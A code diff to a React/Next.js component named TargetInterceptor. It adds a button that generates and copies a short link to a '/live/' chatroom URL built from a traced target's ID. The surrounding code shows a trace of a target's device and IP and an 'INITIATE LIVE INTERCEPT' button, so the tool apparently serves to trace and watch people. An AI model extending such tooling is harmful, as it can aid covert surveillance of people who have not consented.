@@ -4,8 +4,8 @@ import React, { useState, useEffect } from 'react';
 import Link from 'next/link';
 import { supabase } from '@/lib/supabaseClient';
 import { useToast } from '../context/ToastContext';
-// Assuming this component exists based on your snippet
-import SecretChatDetails from '../component/SystemDetails/SecretChatroom'; 
+import { generateSlug } from '../utils/generateSlug';
+import SecretChatDetails from '../component/SystemDetails/SecretChatroom';
 
 export default function TargetInterceptor() {
   const toast = useToast();
@@ -14,6 +14,9 @@ export default function TargetInterceptor() {
   const [result, setResult] = useState<{ masterId: string; device: string; ip: string } | null>(null);
   const [error, setError] = useState("");
   const [creatorId, setCreatorId] = useState("");
+  const [shortLink, setShortLink] = useState("");
+  const [creatingShortLink, setCreatingShortLink] = useState(false);
+  const [shortLinkCopied, setShortLinkCopied] = useState(false);
 
   // 1. Get Your User ID (The Creator/Admin Key)
   useEffect(() => {
@@ -66,6 +69,31 @@ export default function TargetInterceptor() {
       toast.error("Trace Error: " + e.message);
     } finally {
       setLoading(false);
+    }
+  };
+
+  const handleCreateShortLink = async () => {
+    if (!result || !creatorId || creatingShortLink) return;
+    setCreatingShortLink(true);
+    try {
+      const { data: { user } } = await supabase.auth.getUser();
+      const slug = generateSlug(6);
+      const chatroomUrl = `${window.location.origin}/live/${result.masterId}/${creatorId}`;
+      await supabase.from('short_links').insert({
+        slug,
+        original_url: chatroomUrl,
+        creator_id: user?.id ?? null,
+      });
+      const short = `${window.location.origin}/s/${slug}`;
+      setShortLink(short);
+      navigator.clipboard.writeText(short).catch(() => {});
+      setShortLinkCopied(true);
+      setTimeout(() => setShortLinkCopied(false), 2000);
+      toast.success("Short link copied to clipboard!");
+    } catch {
+      toast.error("Failed to create short link.");
+    } finally {
+      setCreatingShortLink(false);
     }
   };
 
@@ -129,13 +157,37 @@ export default function TargetInterceptor() {
                 </div>
 
                 {/* THE MAGIC LINK (Corrected Logic) */}
-                <Link 
-                    // Logic: /live/[TARGET_HASH]/[YOUR_ID]
+                <Link
                     href={`/live/${result.masterId}/${creatorId}`}
                     className="block w-full py-3 bg-gradient-to-r from-green-600 to-emerald-600 rounded-xl font-bold text-black text-center hover:shadow-[0_0_20px_rgba(16,185,129,0.5)] hover:scale-[1.02] transition-all text-sm uppercase tracking-widest"
                 >
                     INITIATE LIVE INTERCEPT ⚡
                 </Link>
+
+                {/* Optional short link */}
+                {shortLink ? (
+                  <div className="flex items-center gap-2 mt-3">
+                    <code className="flex-1 text-[10px] text-emerald-400 font-mono bg-black/60 border border-green-900/50 px-3 py-2 rounded-lg truncate">
+                      {shortLink}
+                    </code>
+                    <button
+                      onClick={() => { navigator.clipboard.writeText(shortLink).catch(() => {}); setShortLinkCopied(true); setTimeout(() => setShortLinkCopied(false), 1500); }}
+                      className={`shrink-0 text-[10px] font-bold px-3 py-2 rounded-lg border transition ${
+                        shortLinkCopied ? 'bg-emerald-500 text-black border-emerald-500' : 'bg-white/5 hover:bg-white/10 border-green-900/50 text-green-400'
+                      }`}
+                    >
+                      {shortLinkCopied ? '✓' : 'Copy'}
+                    </button>
+                  </div>
+                ) : (
+                  <button
+                    onClick={handleCreateShortLink}
+                    disabled={creatingShortLink}
+                    className="w-full mt-2 py-2.5 bg-green-900/20 border border-green-500/30 rounded-xl font-bold text-green-400 text-xs uppercase tracking-widest hover:bg-green-500/10 transition disabled:opacity-50"
+                  >
+                    {creatingShortLink ? 'Creating…' : '🔗 Generate Short Link'}
+                  </button>
+                )}
 
             </div>
         )}
